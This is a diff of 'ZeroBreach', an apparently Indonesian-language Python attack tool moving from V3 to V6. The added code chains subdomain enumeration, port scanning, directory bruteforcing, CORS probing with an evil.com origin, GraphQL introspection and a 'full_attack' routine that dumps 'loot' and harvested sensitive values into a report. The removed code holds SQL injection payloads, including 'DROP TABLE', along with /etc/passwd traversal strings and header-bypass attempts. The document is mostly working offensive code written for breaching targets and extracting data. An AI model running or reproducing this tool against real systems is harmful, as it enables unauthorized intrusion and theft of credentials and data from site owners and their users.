+                r = self._req("GET", url, allow_redirects=False)
+                if r and "root:x:" in r.text:
+                    log("crit", f"Traversal: {param}={tr}")
+                    self._auto_dump(f"traversal_{param}", r)
+
+    # ============================================================
+    # SUBDOMAIN ENUM
+    # ============================================================
+    def subdomain_enum(self):
+        print(f"\n{C}=== SUBDOMAIN ENUM ==={RESET}")
+        parsed = urlparse(self.target)
+        host = parsed.hostname
+        if not host:
+            return
+        parts = host.split(".")
+        if len(parts) < 2:
+            log("warn", "Domain terlalu pendek.")
+            return
+        root = ".".join(parts[-2:])
+        subs = ["www", "api", "admin", "dev", "staging", "test",
+                "mail", "ftp", "ssh", "vpn", "panel", "cp",
+                "cpanel", "whm", "webmail", "portal", "app",
+                "beta", "demo", "internal", "intranet"]
+        log("info", f"Root: {root} | Sub: {len(subs)}")
+
+        def _check(s):
+            full = f"{s}.{root}"
+            try:
+                ip = socket.gethostbyname(full)
+                return full, ip
+            except Exception:
+                return None
+
+        with ThreadPoolExecutor(max_workers=15) as ex:
+            futs = [ex.submit(_check, s) for s in subs]
+            for f in as_completed(futs):
+                res = f.result()
+                if res:
+                    name, ip = res
+                    self._record("med", f"Subdomain: {name}", ip)
+
+    # ============================================================
+    # PORT SCAN
+    # ============================================================
+    def port_scan(self):
+        print(f"\n{C}=== PORT SCAN ==={RESET}")
         host = urlparse(self.target).hostname
         if not host:
             return
-        ports = {
-            21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS",
-            3306: "MySQL", 6379: "Redis", 27017: "MongoDB",
-            8080: "Alt HTTP", 8443: "Alt HTTPS",
-        }
+        ports = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+                 53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
+                 443: "HTTPS", 3306: "MySQL", 5432: "PostgreSQL",
+                 6379: "Redis", 8080: "Alt HTTP", 8443: "Alt HTTPS",
+                 9200: "Elasticsearch", 27017: "MongoDB"}
         for port, name in ports.items():
             try:
                 s = socket.create_connection((host, port), timeout=3)
                 s.close()
                 sev = "info" if port in (80, 443) else "high"
-                self._record(sev, f"Port terbuka: {port}", name)
+                self._record(sev, f"Port: {port}", name)
             except Exception:
                 pass
 
     # ============================================================
-    # STAGE 9 — ENDPOINT SCAN (FOKUS 1 URL)
+    # DIRECTORY BRUTEFORCE
     # ============================================================
-    def stage_endpoint_scan(self):
-        ep = self.target
-        print(f"\n{C}=== STAGE 9: ENDPOINT SCAN ==={RESET}")
-        print(f"{C}Target: {W}{ep}{RESET}\n")
+    def dir_bruteforce(self):
+        print(f"\n{C}=== DIRECTORY BRUTEFORCE ==={RESET}")
+        base = self.target.split("/api/")[0] if "/api/" in self.target else self.target
+        baseline_r = self.get(f"/{rnd_str(16)}", allow_redirects=False)
+        baseline_len = len(baseline_r.text) if baseline_r else 0
 
-        # 1. HTTP methods
-        print(f"{C}[1/9] HTTP methods...{RESET}")
-        for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]:
-            r = self._req(method, ep, allow_redirects=False)
-            if not r:
-                continue
-            code = r.status_code
-            size = len(r.text)
-            sev = "info"
-            if code in (200, 201) and method != "GET":
-                sev = "high"
-            elif code in (401, 403):
-                sev = "med"
-            self._record(sev, f"{method} {ep}", f"HTTP {code} | {size}B")
+        def _check(d):
+            return d, self.get(f"/{d}", allow_redirects=False)
 
-        # 2. Header bypass
-        print(f"\n{C}[2/9] Header bypass...{RESET}")
-        hit_bypass = False
-        for h in BYPASS_HEADERS:
-            r = self._req("GET", ep, headers=h, allow_redirects=False)
-            if r and r.status_code == 200 and looks_like_data(r.text):
-                self._record("crit", f"Bypass works: {ep}",
-                             f"{list(h.keys())[0]}={list(h.values())[0]}")
-                self._auto_dump(f"bypass_{list(h.keys())[0]}", r)
-                hit_bypass = True
-        if not hit_bypass:
-            log("info", "Nggak ada header bypass yang tembus.")
+        log("info", f"Cek {len(DIR_WORDLIST)} directory...")
+        with ThreadPoolExecutor(max_workers=self.threads) as ex:
+            futs = [ex.submit(_check, d) for d in DIR_WORDLIST]
+            for f in as_completed(futs):
+                res = f.result()
+                if not res:
+                    continue
+                d, r = res
+                if not r:
+                    continue
+                if r.status_code == 200:
+                    if baseline_len and abs(len(r.text) - baseline_len) < 50:
+                        continue
+                    self._record("med", f"Dir: /{d}", f"HTTP 200 | {len(r.text)}B")
+                    if looks_like_data(r.text):
+                        self._auto_dump(f"dir_{d}", r)
+                elif r.status_code == 403:
+                    self._record("info", f"Dir: /{d}", "403 (ada tapi blocked)")
+                elif r.status_code == 401:
+                    self._record("med", f"Dir: /{d}", "401 (butuh auth)")
 
-        # 3. Parameter tampering
-        print(f"\n{C}[3/9] Parameter tampering...{RESET}")
-        base = ep.split("?")[0].rstrip("/")
-        params = [
-            "?id=1", "?id=0", "?id=-1", "?id=99999999",
-            "?admin=1", "?debug=1", "?test=1",
-            "?user_id=1", "?account_id=1",
-            "?format=json", "?output=json",
-        ]
-        for param in params:
-            r = self._req("GET", base + param, allow_redirects=False)
-            if not r:
-                continue
-            if r.status_code == 200 and looks_like_data(r.text):
-                if len(r.text) > 50:
-                    self._record("high", f"Param dump: {param}", f"{len(r.text)}B")
-                    self._auto_dump(f"param_{safe_name(param)}", r)
-            if r.status_code == 500:
-                self._record("high", f"Error 500: {param}", "crash")
+    # ============================================================
+    # CORS SCAN
+    # ============================================================
+    def cors_scan(self):
+        print(f"\n{C}=== CORS SCAN ==={RESET}")
+        r = self.get("/", headers={"Origin": "https://evil.com"})
+        if not r:
+            return
+        acao = r.headers.get("Access-Control-Allow-Origin", "")
+        acac = r.headers.get("Access-Control-Allow-Credentials", "")
+        acam = r.headers.get("Access-Control-Allow-Methods", "")
+        if acao == "*":
+            self._record("med", "CORS wildcard", f"ACAO: *")
+        elif "evil.com" in acao:
+            self._record("high", "CORS reflects origin", f"ACAO: {acao}")
+        if acao and acac.lower() == "true":
+            self._record("crit", "CORS + credentials", "kombinasi bahaya")
+        if acam:
+            self._record("info", "CORS methods", acam)
 
-        # 4. SQL injection
-        print(f"\n{C}[4/9] SQL injection test...{RESET}")
-        sqli = ["'", "\"", "' OR '1'='1", "' OR 1=1--",
-                "1' AND SLEEP(3)--", "1 UNION SELECT NULL--",
-                "%27", "1;DROP TABLE users--"]
-        for pl in sqli:
-            test_url = base + f"?id={pl}"
-            start = time.time()
-            r = self._req("GET", test_url, allow_redirects=False)
-            elapsed = time.time() - start
-            if not r:
-                continue
-            if r.status_code == 500:
-                self._record("high", f"SQLi suspect: {pl}", "HTTP 500")
-            if elapsed > 2.5:
-                self._record("crit", f"Time-based SQLi: {pl}", f"delay {elapsed:.1f}s")
-            if "sql" in r.text.lower() or "syntax" in r.text.lower():
-                self._record("crit", f"SQL error leak: {pl}", "error di response")
+    # ============================================================
+    # HEADER ANALYSIS
+    # ============================================================
+    def header_analysis(self):
+        print(f"\n{C}=== HEADER ANALYSIS ==={RESET}")
+        r = self.get("/")
+        if not r:
+            return
+        sec_headers = {
+            "Strict-Transport-Security": "HSTS",
+            "Content-Security-Policy": "CSP",
+            "X-Frame-Options": "X-Frame-Options",
+            "X-Content-Type-Options": "X-Content-Type",
+            "Referrer-Policy": "Referrer-Policy",
+            "Permissions-Policy": "Permissions-Policy",
+        }
+        for h, name in sec_headers.items():
+            if h in r.headers:
+                self._record("info", f"[✓] {name}", r.headers[h][:80])
+            else:
+                self._record("med", f"[✗] {name}", "MISSING")
 
-        # 5. Path traversal
-        print(f"\n{C}[5/9] Path traversal...{RESET}")
-        for tr in ["../../etc/passwd", "..%2f..%2fetc%2fpasswd",
-                   "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]:
-            r = self._req("GET", base + f"?file={tr}", allow_redirects=False)
-            if r and "root:x:" in r.text:
-                self._record("crit", f"Path traversal: {tr}", "etc/passwd leak")
-                self._auto_dump("traversal_passwd", r)
+    # ============================================================
+    # GRAPHQL PROBE
+    # ============================================================
+    def graphql_probe(self):
+        print(f"\n{C}=== GRAPHQL PROBE ==={RESET}")
+        endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
+        introspection = {"query": "{__schema{types{name fields{name}}}}"}
+        for ep in endpoints:
+            r = self.post(ep, json_data=introspection)
+            if r and r.status_code == 200 and "__schema" in r.text:
+                log("crit", f"GraphQL introspection AKTIF: {ep}")
+                self._record("crit", "GraphQL introspection", ep)
+                self._auto_dump(f"graphql{safe_name(ep)}", r)
 
-        # 6. CORS
-        print(f"\n{C}[6/9] CORS check...{RESET}")
-        r = self._req("GET", ep, headers={"Origin": "https://evil.com"})
-        if r:
-            acao = r.headers.get("Access-Control-Allow-Origin", "")
-            acac = r.headers.get("Access-Control-Allow-Credentials", "")
-            if acao == "*":
-                self._record("med", "CORS wildcard", f"ACAO: {acao}")
-            elif "evil.com" in acao:
-                self._record("high", "CORS reflects origin", f"ACAO: {acao}")
-            if acao and acac.lower() == "true":
-                self._record("high", "CORS + credentials", "kombinasi bahaya")
-
-        # 7. Response body
-        print(f"\n{C}[7/9] Response body analisa...{RESET}")
-        r = self._req("GET", ep)
-        if r:
-            body = r.text
-            kind = get_kind(body)
-            self._record("info", "Response kind", f"{kind} | {len(body)}B")
-            m = re.search(r'["\'](token|api[_-]?key|secret)["\']\s*:\s*["\']([^"\']+)["\']',
-                          body, re.I)
-            if m:
-                self._record("crit", "Credential di response",
-                             f"{m.group(1)}={m.group(2)[:60]}")
-            if looks_like_data(body):
-                self._auto_dump("endpoint_body", r)
-
-        # 8. Rate limit
-        print(f"\n{C}[8/9] Rate limit check (20 req)...{RESET}")
-        codes = []
-        for i in range(20):
-            r = self._req("GET", ep, allow_redirects=False)
-            if r:
-                codes.append(r.status_code)
-        if 429 in codes:
-            self._record("info", "Rate limit aktif",
-                         f"429 di req #{codes.index(429)+1}")
-        else:
-            self._record("med", "No rate limit", "20 req tanpa 429")
-
-        # 9. Auth check
-        print(f"\n{C}[9/9] Auth check...{RESET}")
-        r = self._req("GET", ep, allow_redirects=False)
-        if r:
-            if r.status_code == 200:
-                self._record("crit", "Endpoint TANPA AUTH",
-                             f"HTTP 200 | {len(r.text)}B")
-                if looks_like_data(r.text):
-                    self._auto_dump("no_auth", r)
-            elif r.status_code == 401:
-                self._record("info", "Endpoint butuh auth", "HTTP 401")
-            elif r.status_code == 403:
-                self._record("info", "Endpoint forbidden", "HTTP 403")
-
-        print(f"\n{G}[+] Endpoint scan selesai.{RESET}")
+    # ============================================================
+    # FULL ATTACK
+    # ============================================================
+    def full_attack(self):
+        self.deep_recon()
+        self.leak_check()
+        self.bypass_attack()
+        self.js_mining()
+        self.sqli_probe()
+        self.path_traversal()
+        self.brute_only()
+        self.subdomain_enum()
+        self.dir_bruteforce()
+        self.cors_scan()
+        self.header_analysis()
+        self.graphql_probe()
+        self.port_scan()
 
     # ============================================================
     # REPORT
@@ -673,7 +886,15 @@ class ZeroBreach:
               f"{R}HIGH: {counts['high']}{RESET}  "
               f"{Y}MED: {counts['med']}{RESET}  "
               f"{C}INFO: {counts['info']}{RESET}")
-        print(f"  {G}Files dumped: {len(self.loot)}{RESET}\n")
+        print(f"  {G}Files dumped: {len(self.loot)}{RESET}")
+        print(f"  {M}Data sensitif: {len(self.sensitive)}{RESET}\n")
+
+        if self.sensitive:
+            print(f"{M}{BOLD}  ═══ DATA PENTING ═══{RESET}")
+            for label, k, v in self.sensitive[:30]:
+                print(f"  {M}●{RESET} {label}")
+                print(f"    {W}{k}{RESET} = {v[:120]}")
+            print()
 
         order = {"crit": 0, "high": 1, "med": 2, "info": 3}
         for sev, name, detail in sorted(self.hits, key=lambda x: order[x[0]]):
@@ -688,7 +909,6 @@ class ZeroBreach:
 
         print()
         print(f"{G}[+] Loot: {self.outdir}/")
-        print(f"{G}[+] Total file dumped: {len(self.loot)}")
 
         try:
             with open("zerobreach_report.json", "w") as f:
@@ -696,50 +916,14 @@ class ZeroBreach:
                     "target": self.target,
                     "creds_found": self.found_creds,
                     "hits": self.hits,
+                    "sensitive": [{"source": l, "key": k, "value": v}
+                                  for l, k, v in self.sensitive],
                     "loot": [{"label": l, "kind": k, "size": s, "file": fp}
                              for l, k, s, fp in self.loot],
                 }, f, indent=2)
             print(f"{G}[+] Report: zerobreach_report.json{RESET}")
         except Exception:
             pass
-
-    # ============================================================
-    # RUNNER
-    # ============================================================
-    def run(self, stages="full"):
-        if stages == "full":
-            if not self.stage_fingerprint():
-                return
-            self.stage_endpoints()
-            self.stage_leaks()
-            self.stage_bypass()
-            self.stage_js()
-            self.stage_firebase()
-            self.stage_creds()
-            self.stage_ports()
-        elif stages == "recon":
-            if not self.stage_fingerprint():
-                return
-            self.stage_endpoints()
-        elif stages == "leak":
-            self.stage_leaks()
-        elif stages == "bypass":
-            self.stage_bypass()
-        elif stages == "brute":
-            self.stage_creds()
-        elif stages == "firebase":
-            self.stage_firebase()
-        elif stages == "js":
-            self.stage_js()
-        elif stages == "ports":
-            self.stage_ports()
-        elif stages == "endpoint":
-            self.stage_endpoint_scan()
-        self.report()
-
-
-def random_string(n=8):
-    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
 
 # ============================================================
@@ -755,6 +939,7 @@ def get_target():
 
 def main():
     clear()
+    print(BANNER)
     while True:
         print(MENU)
         pilihan = input(f"{C}[?]{RESET} Pilih: ").strip()
@@ -763,53 +948,75 @@ def main():
             print(f"\n{Y}[!] Keluar. 6767.{RESET}")
             sys.exit(0)
 
-        if pilihan not in [str(i) for i in range(1, 10)]:
+        if pilihan not in [str(i) for i in range(1, 16)]:
             clear()
+            print(BANNER)
             log("err", "Pilihan nggak valid.")
             time.sleep(1)
             clear()
+            print(BANNER)
             continue
 
         target = get_target()
         if not target:
             time.sleep(1)
             clear()
+            print(BANNER)
             continue
 
         outdir = input(f"{C}[?]{RESET} Outdir (default loot): ").strip() or "loot"
-        threads_in = input(f"{C}[?]{RESET} Threads (default 20): ").strip() or "20"
+        threads_in = input(f"{C}[?]{RESET} Threads (default 10): ").strip() or "10"
         try:
             threads = int(threads_in)
         except ValueError:
-            threads = 20
+            threads = 10
 
         clear()
-        print(f"{G}{BOLD}=== ZeroBreach V3 ==={RESET}")
+        print(f"{G}{BOLD}=== ZeroBreach V6 ==={RESET}")
         print(f"{C}Target : {W}{target}{RESET}")
         print(f"{C}Outdir : {W}{outdir}{RESET}")
         print(f"{C}Threads: {W}{threads}{RESET}\n")
 
         tool = ZeroBreach(target, threads=threads, outdir=outdir)
 
-        stages = {
-            "1": "full",
-            "2": "recon",
-            "3": "leak",
-            "4": "bypass",
-            "5": "brute",
-            "6": "firebase",
-            "7": "js",
-            "8": "ports",
-            "9": "endpoint",
-        }[pilihan]
-
         try:
-            tool.run(stages=stages)
+            if pilihan == "1":
+                tool.auto_chain()
+            elif pilihan == "2":
+                tool.full_attack()
+            elif pilihan == "3":
+                tool.deep_recon()
+            elif pilihan == "4":
+                tool.leak_check()
+            elif pilihan == "5":
+                tool.bypass_attack()
+            elif pilihan == "6":
+                tool.brute_only()
+            elif pilihan == "7":
+                tool.js_mining()
+            elif pilihan == "8":
+                tool.sqli_probe()
+            elif pilihan == "9":
+                tool.path_traversal()
+            elif pilihan == "10":
+                tool.subdomain_enum()
+            elif pilihan == "11":
+                tool.port_scan()
+            elif pilihan == "12":
+                tool.dir_bruteforce()
+            elif pilihan == "13":
+                tool.cors_scan()
+            elif pilihan == "14":
+                tool.header_analysis()
+            elif pilihan == "15":
+                tool.graphql_probe()
+            tool.report()
         except KeyboardInterrupt:
             print(f"\n{Y}[!] Interrupted.{RESET}")
 
         pause()
         clear()
+        print(BANNER)
 
 
 if __name__ == "__main__":
